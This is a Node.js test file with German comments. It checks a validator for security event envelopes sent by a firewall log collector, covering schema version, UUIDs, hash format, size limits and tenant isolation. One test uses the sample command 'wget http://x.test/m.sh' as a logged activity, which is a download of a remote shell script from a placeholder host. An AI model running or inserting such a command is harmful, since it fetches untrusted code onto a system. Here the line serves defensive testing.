'use strict';

const { test } = require('node:test');
const assert = require('node:assert');
const { validateEnvelope, SCHEMA_VERSION } = require('../src/contract/eventEnvelopeV1');

// Gültiger Basis-Envelope (Collector-Sicht) — alle Pflichtfelder, keine Server-Felder.
const valid = () => ({
  schemaVersion: '1.0',
  eventId: '3f2504e0-4f89-41d3-9a0c-0305e82c3301',
  observedAt: '2026-06-24T19:05:20.935Z',
  source: { type: 'firewall', vendor: 'opnsense', instanceId: 'fw-01' },
  raw: { hash: 'a'.repeat(64), ref: 's3://raw/2026/06/24/abc.json' },
  provenance: { parserVersion: '1.2.0', confidence: 0.9, warnings: [] },
  normalized: { entities: [{ type: 'ip', value: '203.0.113.45' }] },
});

test('gültiger Envelope passiert', () => {
  const r = validateEnvelope(valid());
  assert.deepStrictEqual(r.errors, []);
  assert.strictEqual(r.valid, true);
});

test('Nicht-Objekt → invalid', () => {
  for (const v of [null, undefined, 'x', 42, []]) {
    assert.strictEqual(validateEnvelope(v).valid, false);
  }
});

test('falsche schemaVersion → invalid', () => {
  const r = validateEnvelope({ ...valid(), schemaVersion: '2.0' });
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.startsWith('schemaVersion')));
  assert.strictEqual(SCHEMA_VERSION, '1.0');
});

test('eventId muss UUIDv4 sein', () => {
  assert.strictEqual(validateEnvelope({ ...valid(), eventId: 'not-a-uuid' }).valid, false);
  // v1-UUID (falsche Version) wird abgelehnt
  assert.strictEqual(validateEnvelope({ ...valid(), eventId: '3f2504e0-4f89-11d3-9a0c-0305e82c3301' }).valid, false);
});

test('observedAt muss ISO-Datum sein', () => {
  assert.strictEqual(validateEnvelope({ ...valid(), observedAt: 'gestern' }).valid, false);
});

test('source-Felder erforderlich', () => {
  const d = valid(); delete d.source.vendor;
  const r = validateEnvelope(d);
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.includes('source.vendor')));
});

test('raw.hash muss SHA-256 sein, raw.ref ≤ 2000', () => {
  assert.strictEqual(validateEnvelope({ ...valid(), raw: { hash: 'short', ref: 'x' } }).valid, false);
  const longRef = { ...valid(), raw: { hash: 'a'.repeat(64), ref: 'x'.repeat(2001) } };
  assert.strictEqual(validateEnvelope(longRef).valid, false);
});

test('Raw-Payload im Envelope ist verboten (nur ref)', () => {
  const d = valid(); d.raw.payload = { huge: 'blob' };
  const r = validateEnvelope(d);
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.includes('payload')));
});

test('provenance.confidence muss in [0,1] sein', () => {
  assert.strictEqual(validateEnvelope({ ...valid(), provenance: { parserVersion: '1', confidence: 1.5 } }).valid, false);
  assert.strictEqual(validateEnvelope({ ...valid(), provenance: { parserVersion: '1', confidence: -0.1 } }).valid, false);
});

test('Limits: warnings ≤ 10, entities ≤ 50', () => {
  const w = valid(); w.provenance.warnings = Array(11).fill('w');
  assert.strictEqual(validateEnvelope(w).valid, false);
  const e = valid(); e.normalized.entities = Array(51).fill({ type: 'ip', value: '1.1.1.1' });
  assert.strictEqual(validateEnvelope(e).valid, false);
});

test('tenantId vom Collector ist VERBOTEN (Tenant-Isolation)', () => {
  const r = validateEnvelope({ ...valid(), tenantId: 't-evil' });
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.startsWith('tenantId')));
});

test('receivedAt vom Collector ist VERBOTEN (server-assigned)', () => {
  const r = validateEnvelope({ ...valid(), receivedAt: '2026-06-24T19:05:21.000Z' });
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.startsWith('receivedAt')));
});

test('normalized ist optional (fehlt → trotzdem gültig)', () => {
  const d = valid(); delete d.normalized;
  assert.strictEqual(validateEnvelope(d).valid, true);
});

test('normalized.activity (additiv, optional) passiert', () => {
  const d = valid();
  d.normalized.activity = { kind: 'command', value: 'wget http://x.test/m.sh' };
  assert.deepStrictEqual(validateEnvelope(d).errors, []);
});

test('normalized.activity.kind muss aus der Allowlist stammen', () => {
  const d = valid();
  d.normalized.activity = { kind: 'exfiltrate', value: 'x' };
  const r = validateEnvelope(d);
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.includes('activity.kind')));
});

test('normalized.activity.value ist längen-gedeckelt (≤ 2000)', () => {
  const d = valid();
  d.normalized.activity = { kind: 'command', value: 'x'.repeat(2001) };
  const r = validateEnvelope(d);
  assert.strictEqual(r.valid, false);
  assert.ok(r.errors.some((e) => e.includes('activity.value')));
});
